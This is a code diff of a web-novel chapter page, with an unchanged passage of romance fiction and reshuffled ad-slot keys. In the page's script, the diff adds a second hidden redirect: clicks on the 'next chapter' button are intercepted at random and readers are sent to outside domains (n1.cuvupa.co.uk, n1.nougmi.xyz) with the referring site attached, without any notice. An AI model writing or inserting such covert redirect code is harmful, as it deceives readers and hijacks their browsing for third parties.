@@ -2390,12 +2390,12 @@
                 <p>A truck roared past, drowning out the rest of his words. By the time the noise faded, Sophia had already reached her apartment complex&#39;s entrance.</p>
                 <p>&#34;Professor, what were you saying?&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>&#34;Oh, nothing important.&#34; Theodore quickly changed the subject. &#34;Your aunt is calling me. I&#39;ll talk to you later.&#34;</p>
                 <p>Just as Sophia put away her phone, it rang again. Seeing &#34;Zachary Evans&#34; flashing on the screen, she frowned.</p>
                 <p>She&#39;d only unblocked him recently to inquire about Ethan Roscente. She hadn&#39;t expected him to call so soon.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>&#34;Hello?&#34;</p>
                 <p>But it was Ethan&#39;s deep voice that answered. &#34;I&#39;m outside your place.&#34;</p>
                 <p>Sophia froze mid-step. &#34;What do you want?&#34;</p>
@@ -2405,18 +2405,18 @@
                 <p>&#34;None of your business.&#34; She moved to hang up.</p>
                 <p>&#34;My stomach hurts.&#34; The words came abruptly.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>Sophia paused, then scoffed. &#34;Go find your fiancée. I&#39;m not a doctor.&#34;</p>
                 <p>&#34;Still your uncle, aren&#39;t I?&#34; Ethan&#39;s voice was weak but teasing. &#34;Shouldn&#39;t you show some filial piety when your elder is unwell?&#34;</p>
                 <p>&#34;I might &#39;piety&#39; you to death.&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>&#34;Dying by my niece&#39;s hand would be a romantic way to go.&#34;</p>
                 <p>&#34;...&#34; Her teeth ground together. &#34;Just suffer then!&#34;</p>
                 <p>Despite her words, her footsteps quickened.</p>
                 <p>A familiar van was parked downstairs. Sophia felt she&#39;d seen it somewhere before, but before she could recall, two giggling girls stepped out of the elevator.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
             </div>
             
             <div class="font-controls">
@@ -2538,7 +2538,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2554,8 +2554,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
